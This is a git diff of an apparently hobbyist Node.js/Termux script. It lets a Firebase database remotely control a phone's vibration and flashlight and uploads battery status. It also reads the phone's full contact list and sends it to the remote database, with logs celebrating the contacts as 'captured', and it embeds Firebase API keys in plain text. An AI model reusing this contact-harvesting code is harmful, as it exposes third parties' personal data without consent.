@@ -4,16 +4,32 @@ import { exec } from "child_process";
 import { error } from "console";
 import { stdout } from "process";
 
+
 const firebaseConfig = {
-    apiKey: "AIzaSyB5bVYBmXpjNyDBniXl-mxtYdXDf8m-6No",
-    authDomain: "umsimples-smartphone.firebaseapp.com",
-    databaseURL: "https://umsimples-smartphone-default-rtdb.firebaseio.com",
-    projectId: "umsimples-smartphone",
-    storageBucket: "umsimples-smartphone.appspot.com",
-    messagingSenderId: "26048398759",
-    appId: "1:26048398759:web:818b83b0c7b3833030e282",
-    measurementId: "G-0D18BG7285"
+    apiKey: "AIzaSyBmfmYuR4YAWGOyUMiawYMymg49T-ZK20A",
+
+
+  authDomain: "smartphonedbtest.firebaseapp.com",
+
+
+  databaseURL: "https://smartphonedbtest-default-rtdb.firebaseio.com",
+
+
+  projectId: "smartphonedbtest",
+
+
+  storageBucket: "smartphonedbtest.firebasestorage.app",
+
+
+  messagingSenderId: "188691501053",
+
+
+  appId: "1:188691501053:web:88cfdabbd6406f10c45394",
+
+
+  measurementId: "G-K8HMHBEJG8"
 };
+
 
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
@@ -22,6 +38,7 @@ const lanternaRef = ref(db, "lanterna/status");
 const bateriaRef = ref(db, "bateria/status");
 const zoioRef = ref(db, "audio-zoio/status");
 const contatosRef = ref(db, "contatos");
+
 
 onValue(vibrarRef, (snapshot) => {
     const vibrar = snapshot.val();
@@ -38,6 +55,7 @@ onValue(vibrarRef, (snapshot) => {
     }
 });
 
+
 onValue(lanternaRef, (snapshot) => {
     const ligarLanterna = snapshot.val();
     if (ligarLanterna) {
@@ -53,12 +71,14 @@ onValue(lanternaRef, (snapshot) => {
     }
 });
 
+
 function atualizarStatusBateria() {
     exec("termux-battery-status", (error, stdout) => {
         if (error) {
             console.error("Num tô conseguindo chegar no coração da morena😔");
             return;
         }
+
 
         const dadosBateria = JSON.parse(stdout);
         set(bateriaRef, {
@@ -76,20 +96,25 @@ function atualizarStatusBateria() {
     });
 }
 
+
 setInterval(atualizarStatusBateria, 30000);
 
+
 atualizarStatusBateria();
+
 
 // onValue(zoioRef, (snapshot) => {
 //     const tiraTira = snapshot.val();
 //     if (tiraTira) {
 //         console.log("Tira, tira!!!😲");
 
+
 //         exec("termux-media-player play midias/audio_zoio.mp3", (error) => {
 //             if (error) {
 //                 console.error("Vou tirar não😏", error);
 //             } else {
 //                 console.log("Eu vou tirar😵!");
+
 
 //                 const monitorarReproducao = setInterval(() => {
 //                     exec("termux-media-player info", (err, stdout) => {
@@ -117,6 +142,7 @@ atualizarStatusBateria();
 //     }
 // });
 
+
 function atualizarContatos() {
     exec("termux-contact-list", (error, stdout) => {
         if (error) {
@@ -124,9 +150,11 @@ function atualizarContatos() {
             return;
         }
 
+
         try {
             const listaContatos = JSON.parse(stdout);
             console.log("A lista tá vindo...");
+
 
             listaContatos.forEach((contato) => {
                 push(contatosRef, {
@@ -135,11 +163,13 @@ function atualizarContatos() {
                 });
             });
 
+
             console.log("Contatinhos capturados😡!");
         } catch (parseError) {
             console.error("Erro, glória🙌", parseError);
         }
     });
 }
+
 
 atualizarContatos();
